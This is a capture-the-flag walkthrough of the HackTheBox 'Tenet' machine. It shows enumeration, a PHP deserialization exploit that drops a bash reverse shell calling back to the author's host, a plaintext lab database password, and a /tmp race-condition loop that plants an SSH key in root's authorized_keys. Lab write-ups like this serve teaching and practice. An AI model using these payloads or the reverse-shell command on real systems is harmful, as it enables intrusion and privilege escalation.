---
title: "Tenet - HackTheBox"
date: 2021-05-27T07:39:10-04:00
draft: false
showToc: true
description: "My solve to the Tenet machine on HackTheBox"
tags: ["htb"]
categories: ["htb"]
---



Another medium level box for hackthebox! As of 27MAY2021, this box is still live. If you have not solved this box please do not use this for a quick user/root.


## TL;DR

User: nmap, enumerate website, found .bak files, created custom php serialization script to pop a reverse shell as www-data. Horizontal movement was achieved by finding user `neil`'s password in a wordpress configuration file.

Root: look at sudo privileges, then add ssh key with bash script. Win the race.

## User

### Nmap

As always, I started off with an nmap scan.

```
$ nmap 10.10.10 223        
                                                                    
Nmap scan report for tenet.htb (10.10.10.223)
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
```

### Enumeration

I saw http open on port 80, so I added `10.10.10.223    tenet.htb` to my `/etc/hosts`. Navigating to our website shows us a blog, with a single comment on one of the company's posts.

The comment mentioned is by a user named `neil` on the post `migration` by the `protagonist`.

Post:
```
We’re moving our data over from a flat file structure to something a bit more substantial. Please bear with us whilst we get one of our devs on the migration, which shouldn’t take too long.
```

Comment:
```
did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
```

So far, we can collect the following possible users:
- protagonist
- neil

Side notes:
- software named Rotas (or is it sator?)
- WordPress 



### Diving Deeper

I decided to run a gobuster scan on `tenet.htb` with my favorite `SecLists` wordlist, `big.txt` which gave us the following output.
```
$ gobuster dir -u http://tenet.htb/ -w /opt/SecLists/Discovery/Web-Content/big.txt -t 100
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-includes (Status: 301)
/wp-content (Status: 301)
===============================================================
```

Going down the line, I tried every webpage. Most of them were blocked or returned success messages, except for `wp-admin`. This provided a login page for some user with a password, so I tried some basic login attempts.

```
admin:admin             not found
neil:admin 	        Error: The password you entered for the username neil is incorrect. Lost your password?
protagonist:admin 	Error: The password you entered for the username protagonist is incorrect. Lost your password?
```

And the classic mistake, showing the user what portion of your login is incorrect. WordPress has now given an attacker information on what users exist, which is `neil` and `protagonist`

But I noticed something was missing, which was the backup file and sator file that neil mentioned in his comment. Usng `tenet.htb/sator.php` was not showing anything, so I reverted to using `10.10.10.223/sator.php` which returned the following.

```
$ curl http://10.10.10.223/sator.php
[+] Grabbing users from text file <br>
[] Database updated <br>                                                                                                            
```

Since a backup file was mentioned, I tried a numerous amount of backup extensions on `sator.php`, until I found the following.

```
$ curl http://10.10.10.223/sator.php.bak
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

We now are able to see that `sator.php` is retrieving information from a user text file, and updating a database. However, I was not interested in that, instead, I saw `$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);`. 

Quick notes:
```
LEARN ABOUT OBJECT SERIALIZATION

link is looking for `arepo` variable
code is then unserializing input without sanitizaiton.
we can use this to execute php data for reverse shell!
```

### Gaining access

I made a custom php script with `php -a` after learning some php on w3schools (great website btw). This script take our `$data` variable, which contains a php exec script for a reverse shell back to my machine, and serializes it then urlencodes it. This is then stored inside our `$user_file`, for us to access after the intial upload through the url or by using wget.

<!-- ```
class DatabaseExport{
    public $user_file = 'exploit.php';
    public $data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.86/9876 0>&1\'"); ?>';
}

$output = urlencode(serialize(new DatabaseExport));
echo $output;
``` -->
```
$ php -a
Interactive mode enabled

php > class DatabaseExport{
php {     public $user_file = 'exploit.php';
php {     public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.86/9876 0>&1\'")';
php { }
php > 
php > $output = urlencode(serialize(new DatabaseExport));
php > echo $output;
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A11%3A%22exploit.php%22%3Bs%3A4%3A%22data%22%3Bs%3A70%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.86%2F9876+0%3E%261%27%22%29%22%3B%7D
php > 
```

Before I did anything else, I started my `netcat` listener in another terminal window with `$ nc -lvnp 9876`

I then passed the output as the url variable of `arepo`, then curled the `exploit.php` right after the upload. 

```
$ curl -X GET http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A11%3A%22exploit.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.86%2F9876+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D && curl http://10.10.10.223/exploit.php
[+] Grabbing users from text file <br>
[] Database updated <br>
[] Database updated <br>
```

I then saw a beautiful output on my terminal window.

```
$ nc -lvnp 9876
listening on [any] 9876 ...
connect to [10.10.14.86] from (UNKNOWN) [10.10.10.223] 43700
bash: cannot set terminal process group (1550): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tenet:/var/www/html$ 
```
A simple shell upgrade was performed with python, a favorite one-liner from PayloadAllTheThings, `python3 -c 'import pty; pty.spawn("/bin/bash")'`

Continuing to poke around, I tried to look at sudo privileges, for which we'll save for later. I then found WordPress configuration files in `/var/www/html/wordpress/wp-config.php` which returned some user information.

```
/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
```

I then switched users into `neil:Opera2112` and was able to `cat users.txt`

## Root

Remember how I found sudo privileges earlier? Well here it comes into play. `neil` has the exact same privileges as our previous user, allowing him to use sudo on a specific file.
```
neil@tenet:~$ sudo -l
User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

I then checked the file with cat.

```
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
cat /usr/local/bin/enableSSH.sh
#!/bin/bash

checkAdded() {
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi
}

checkFile() {
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
                /bin/echo "Error in creating key file!"
                if [[ -f $1 ]]; then /bin/rm $1; fi
                exit 1
        fi
}

addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key >>$tmpName
        checkFile $tmpName
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        /bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded

```

It looked like the program was generating a tmp file for ssh keys, then reading the file and adding the key to `authorized_keys`
Now after viewing that, something specific caught my eye.
```
tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
```
We have a race condition, and we want to overwrite the file between creation and the key to the authorized_keys. Oh and for a stable connection, I switched over from using my php shell to ssh with `neil`. `ssh neil@10.10.10.223 -p Opera2112`. This allowed me to use `tmux` for the next portion.

Using bash, I wrote a quick script to echo my htb.pub key I generated with `ssh-keygen -t rsa` on my local machine, and pipe it into any and all `ssh` files available inside `/tmp`. In one window of tmux, I ran the following:

```
while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHohH9PWcrvpbdLRj68LeY3AEqGSv0P4As/DK3HwuokgYZwtYMkRVnKiQBGTlmZCFswHFb0iSlfLZE4GZejewAycULP2TzMozlkjoJWBCKonTvMlwBoXEXf58jGm3zOmdKPRys6sfw/Uexx1nEpCSO5xNunKEbRK0lNX7gjYfiy7C5H4n7nUsmTgyRkJ6QajpuZqP/HxsHbnSLasdue4IwPmvMDfUgB/i6uLem+xR1KlBk6fiJb5yUmfOW14OgMaShYj44RV+5vS8Ec07ZeBbWgQ4t5dpclX7eMkXnWcXjyJHCu2ZMaE0lJ3VdUnsgSwP8oLn717q+gmsIlkUviv+FCIuA3xy8tXaY7Lsujd4SUppE7tRrVa8HcxdfhIs/xvXV4MaMZCl1CDFO5LDvxnd/j9F1AtAJwxBsN5Mpj6roELm31Hjm9sQVRBFw7LUkkHyLnPIIgVu6XXWjiA+6/eB9uo3odNZMZMar6IB3AWg7JU+3b67ELVNqid8uJPiCHH8= f0ur3y3s@f0ur3y3skali" | tee /tmp/ssh*; done
```

And in another window, I ran the following:
```
sudo /usr/local/bin/enableSSH.sh
```

Winner, winner, chicken dinner. I had root access.

```
$ ssh root@10.10.10.223 -i ~/.ssh/htb                
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
root@tenet:~# cat root.txt
```

<!-- `hfxS53gy$YDGYBt.0P7G3TpKB0qo.gkUNClP2CRMHyCNU/2aVjQSPN3mxpL4hs7XYX1XNM5mSEGiASvizwxTV0DToS/wDV.` -->


## What did I learn?
- PHP object serialization/deserialization
- How to add my own ssh key to a box to establish a stable connection
- Writing PHP to generate url-encoded and serialized output for a reverse shell


## References
- https://gist.github.com/rshipp/eee36684db07d234c1cc
- https://www.w3schools.com/php/func_var_serialize.asp